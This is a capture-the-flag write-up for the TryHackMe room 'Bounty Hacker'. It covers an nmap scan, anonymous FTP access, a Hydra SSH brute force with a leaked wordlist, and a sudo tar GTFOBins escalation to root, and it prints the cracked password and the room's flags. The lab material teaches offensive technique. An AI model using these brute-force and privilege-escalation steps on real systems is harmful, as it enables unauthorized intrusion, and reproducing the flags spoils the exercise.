# Room Information

Room link: https://tryhackme.com/room/cowboyhacker

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/27/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.2.76 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat PortScan.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 14:52 EDT
Nmap scan report for 10.10.2.76
Host is up (0.091s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cannot get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.54.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn not have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.62 seconds
```

# 
> Scanning the FTP Server
6. `ftp {TARGET IP}` to initate an FTP connection with the target
7. `ls` to list the contents in the target's FTP server, which reveals there to be two files: **locks.txt** and **task.txt**
8. `get {FILE1}.txt` to get the first file we found, which was **locks.txt**, from the FTP server and download a copy of it onto our local machine
9. `get {FILE2}.txt` to get the second file we found, which was **task.txt**, from the FTP server and download a copy of it onto our local machine
10. `exit` to exit the FTP session and close the connection between our machine and the target's FTP server
```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.2.76
Connected to 10.10.2.76.
220 (vsFTPd 3.0.3)
Name (10.10.2.76:root): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```
```bash
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (7.5214 MB/s)
```
```bash
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (65.4894 kB/s)
```
```bash
ftp> exit
221 Goodbye.
```
11. `cd {DOWNLOADS DIRECTORY PATH}` to change to the Downloads directory since that's where our downloaded files should be
12. `ls` to verify that the files have actually been downloaded from the target's FTP server (Which they have)
```bash
┌──(kali㉿kali)-[~]
└─$ cd ~/Downloads
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
locks.txt
task.txt
```
13. `cat {FILE1}.txt` to display the contents of the first file we found, which was locks.txt, which displays a list of strings
13. `cat {FILE2}.txt` to display the contents of the second file we found, which was task.txt, which display a task list, as well as a to us a potential username associated with the target's server
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

# Vulnerability Exploitation
> Brute Forcing Using Hydra
14. `hydra -l lin -P {FILE1}.txt ssh://{TARGET IP}` to attempt to crack this user's password using the **locks.txt** file that we found on the target's FTP server, which turned out that one of the strings within that text file was the password that our target user used to connect to the target via SSH
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l lin -P locks.txt 10.10.2.76 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-06-26 20:20:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.2.76:22/
[22][ssh] host: 10.10.2.76   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-06-26 20:20:54
```

#
> Connecting to the Target Through SSH
15. `ssh lin@{TARGET IP} -p 22` to connect to the target via SSH using the new set of credentials that we have 
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh lin@10.10.2.76 -p 22
The authenticity of host '10.10.2.76 (10.10.2.76)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.2.76' (ECDSA) to the list of known hosts.
lin@10.10.2.76's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 
```
16. `find / -type f -name user.txt 2>/dev/null` to search for the **user.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
17. `cat {USER.TXT FILE PATH}` to display contents of the user.txt file on the terminal
```bash
lin@bountyhacker:~/Desktop$ find / -type f -name user.txt 2>/dev/null
/home/lin/Desktop/user.txt
```
```bash
lin@bountyhacker:~/Desktop$ cat /home/lin/Desktop/user.txt
THM{CR1M3_SyNd1C4T3}
```

# Post Exploitation
> Privilege Escalation
18. `sudo -l` to list the sudo privileges assigned to the user that we're logged in as, which shows that they can execute the **tar** command without needing the root's password
```bash
lin@bountyhacker:~/Desktop$ sudo -l 
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
19. `firefox "https://gtfobins.github.io/"` to launch firefox and direct it to go to the GTFOBins website and then we searched for the **tar** command

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bounty%20Hacker/GTFOBins%20Tar.pngGTFOBins%20Tar.png)
21. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` to escalate privileges by spawning in a Bourne shell (According to GTFOBins)
22. `whoami` to see if we’re now logged in as a higher privileged account, which shows that we're now logged in as root
```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading '/' from member names
#
```
```bash
# whoami
root
```
22. `find / -type f -name root.txt 2>/dev/null` to search for the **root.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
23. `cat {ROOT.TXT FILE PATH}` to display contents of the root.txt file on the terminal
```bash
# find / -type f -name root.txt 2>/dev/null
/root/root.txt
```
```bash
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

**Room completed!**

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Bounty%20Hacker.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `ftp {TARGET IP}`
4. `ls`
5. `get {FILE1}.txt`
6. `get {FILE2}.txt`
7. `exit`
8. `cd {DOWNLOADS DIRECTORY PATH}`
9. `ls`
10. `cat {FILE1}.txt`
11. `cat {FILE2}.txt`
12. `hydra -l lin -P {FILE1}.txt ssh://{TARGET IP}`
13. `ssh lin@{TARGET IP} -p 22`
14. `find / -type f -name user.txt 2>/dev/null`
15. `cat {USER.TXT FILE PATH}`
16. `sudo -l`
17. `firefox "https://gtfobins.github.io/"`
18. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
19. `whoami`
20. `find / -type f -name root.txt 2>/dev/null`
21. `cat {ROOT.TXT FILE PATH}`

# Dissecting Some Commands
`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `> {FILENAME1}.txt` redirects the results into a text file



`hydra -l lin -P {FILE1}.txt ssh://{TARGET IP}`
+ `-l lin` specifies that "**lin**" is the username to be used during the attack
+ `-P {FILE1}.txt` specifies the file containing the list of passwords to be used for the brute-force attack
+ `ssh://{TARGET IP}` specifies the SSH server that we want to attack


`find / -type f -name user.txt 2>/dev/null`
+ `/` specifies the starting directory to be the root directory
+ `-type f` specifies that it should only search for regular files
+ `-name user.txt` specifies to search for a file called user.txt
+ `2>/dev/null` redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal


`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
+ `-cf /dev/null /dev/null` creates an archive file called **/dev/null** that contains the **/dev/null** file itself, which results in an archive file that won't contain any data since the **/dev/null** file is a special file that discards any data that gets written to it
+ `--checkpoint=1` specifies that a checkpoint message after processing every file
+ `--checkpoint-action=exec=/bin/sh` specifies that the **/bin/sh** command should be executed when a checkpoint message is printed


`find / -type f -name root.txt 2>/dev/null`
+ `/` specifies the starting directory to be the root directory
+ `-type f` specifies that it should only search for regular files
+ `-name root.txt` specifies to search for a file called root.txt
+ `2>/dev/null` redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal


# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/



